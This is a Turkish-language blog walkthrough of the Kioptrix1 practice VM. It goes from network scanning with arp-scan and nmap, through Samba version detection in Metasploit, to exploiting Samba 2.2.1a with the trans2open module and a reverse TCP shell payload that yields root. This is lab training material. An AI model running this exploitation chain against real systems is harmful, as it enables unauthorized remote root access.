---
title: "[TR] Kioptrix1 - Walkthrough"
date: 2020-10-09 23:37:00 +03:00
---


Merhaba arkadaşlar,bugün sizlere Kioptrix1 isimli zafiyetli makineyi ele geçirmeye çalışacağım.


**UYARI!** Kioptrix makinesinin .vmx uzantılı dosyasını not defteri gibi uygulama ile açıp "bridged" kelimesini aratın.Ardından iki tırnak içerisindeki "bridged" kelimesini "nat" ile değiştirin.Aynı zamanda kendi makineninizinde NAT seçeğini ile bağlandığından emin olun.


İlk olarak **ifconfig** komutu ile kendi makinemin IP adresini öğreniyorum.

![Kali LİNUX-2020-10-09-23-43-30-79621c.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-43-30-79621c.png)

Ardından sanal makinemde localhost üzerinden **arp-scan -l** taraması yapıyorum.

![Kali LİNUX-2020-10-09-23-02-50.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-02-50.png)

Evet,Kioptrix1 isimli hedef makinemizin IP Adresi **192.168.75.156** olarak öğrendim.

Şimdi sırada nmap taraması yapmakta.
**nmap -sS -sV  192.168.75.156** komutu ile nmap taramamı başlatıyorum.Bu taramada tcp syn scan isteği ve version tespitini de istemiş oluyorum.

![Kali LİNUX-2020-10-09-23-04-53-8d7406.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-04-53-8d7406.png)

Nmap parametreleri isteği doğrultusunda açık olan portları görebiliyorum şuan.Fakat 139/tcp portunun versiyon tespitini alamadık.Bunu öğrenmek için Metasploit aracını kullanacağım.

Yeni bir komut satırı açıp **msfconsole** komutu ile Metasploit aracını açıyorum.

![Kali LİNUX-2020-10-09-23-07-46.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-07-46.png)

Versiyon tespitini öğrenmek için Auxiliary modülünü kullanacağım.
Komut satırına **show auxiliary** yazarak Auxiliary modülünün içeriğini görüntülüyorum.

![Kali LİNUX-2020-10-09-23-12-24.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-12-24.png)

Bu modül içeriğini baktığımda **scanner/smb/smb_version** modülünü görüyorum.Bunu kullanacağım. 

![Kali LİNUX-2020-10-09-23-13-50.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-13-50.png)

Şimdi sıra bu modülü kullanmakta.Komut satırına **use scanner/smb/smb_version yazarak bunu yapıyorum.

![Kali LİNUX-2020-10-09-23-14-06-951382.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-14-06-951382.png)

Bu modülün ayarlamalarını yapacağım çünkü buna hedef makinenin IP adresini tanımlamam gerek.Komut satırına **show options** komutu yazarak bunu yapıyorum.

![Kali LİNUX-2020-10-09-23-14-19-64ce2e.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-14-19-64ce2e.png)

**set rhosts 192.168.75.156** komutu ile hedef makinenin IP adresini tanımladım.

![Kali LİNUX-2020-10-09-23-14-52.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-14-52.png)
![Kali LİNUX-2020-10-09-23-15-05.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-15-05.png)

Hedef makinemizin IP Adresini tanımladıktan sonra **run** komutu ile bu modülü çalıştıyorum.

![Kali LİNUX-2020-10-09-23-15-17.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-15-17.png)

EVET! Version tespitini yaptık **Samba 2.2.1a**

Şimdi bu versiyona uygun exploit bulmakta.Msfconsole içerisinde **search Samba 2.2 ** komutu ile arama yapıyorum.

![Kali LİNUX-2020-10-09-23-16-35.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-16-35.png)

Bize uygun exploit seçeneğini buldum gibi.Bu modülü kullanacağım.Bunun için **use exploit/linux/samba/trans2open** komutunu yazarak exploiti kullanacağım.Ama öncesinde exploiti çalıştırabilmek için hedef sistemin IP adresini atayacağım.

![Kali LİNUX-2020-10-09-23-17-45.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-17-45.png)
![Kali LİNUX-2020-10-09-23-18-00.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-18-00.png)

EVETT Ip adresini tanımladık gördüğünüz gibi.

![Kali LİNUX-2020-10-09-23-18-08.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-18-08.png)

Şimdi buradaki payload listesini görüntüleyelim.Komut olarak 
**show payloads** yazarak bunu yapıyorum.

![Kali LİNUX-2020-10-09-23-19-33.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-19-33.png)

İçeriğine bakarak bana uygun olan payload olan **linux//x86/shell/reverse_tcp ** gibi bunu kullanarak hedef makine üzerinde Reverse Shell almayı deneyeceğim.

![Kali LİNUX-2020-10-09-23-21-17.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-21-17.png)

Ardından **exploit** diyerek shell almaya çalışıyorum.

![Kali LİNUX-2020-10-09-23-21-33.png](/uploads/Kali%20L%C4%B0NUX-2020-10-09-23-21-33.png)

**Whoami** komutu ile root olduğumuzu gördük.Kioptrix1 makinesini başarıyla ele geçirmiş olduk.







